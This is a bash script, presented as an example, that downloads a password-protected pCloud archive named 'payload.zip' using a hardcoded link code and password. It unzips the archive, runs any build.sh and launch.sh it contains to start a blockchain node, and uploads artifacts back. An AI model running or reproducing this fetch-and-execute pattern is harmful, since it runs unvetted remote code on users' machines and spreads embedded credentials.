#!/bin/bash
set -e

# Example script to download a password-protected pCloud public link,
# build the included project, upload the result back to pCloud, and launch
# the blockchain node. Adjust the commands as needed for your project.

LINK_CODE="${1:-kZu3Rf5Z8NP12B4rfWyIY1QB9YrSiFbAXYmX}"
PASSWORD="${2:-3rdCovenAnt448+}"

WORKDIR="$(pwd)/pcloud_build"
mkdir -p "$WORKDIR"
cd "$WORKDIR"

# Download information about the public link
curl -fsSL "https://eapi.pcloud.com/getpublinkdownload?code=${LINK_CODE}&password=${PASSWORD}" -o info.json

# Extract download URL
DOWNLOAD_URL=$(grep -o 'https:[^"\\]*' info.json | head -n 1)
if [ -z "$DOWNLOAD_URL" ]; then
    echo "Failed to retrieve download URL from pCloud" >&2
    exit 1
fi

curl -L "$DOWNLOAD_URL" -o payload.zip
unzip -o payload.zip

# Run build script if present
if [ -x build.sh ]; then
    ./build.sh
fi

# Upload build artifacts back to pCloud (modify path as needed)
if compgen -G "*.tar.gz" > /dev/null; then
    for artifact in *.tar.gz; do
        curl -F "file=@$artifact" "https://eapi.pcloud.com/uploadfile?pub_key=${LINK_CODE}&password=${PASSWORD}"
    done
fi

# Launch blockchain node if a launch script is provided
if [ -x launch.sh ]; then
    ./launch.sh
fi

cd ..

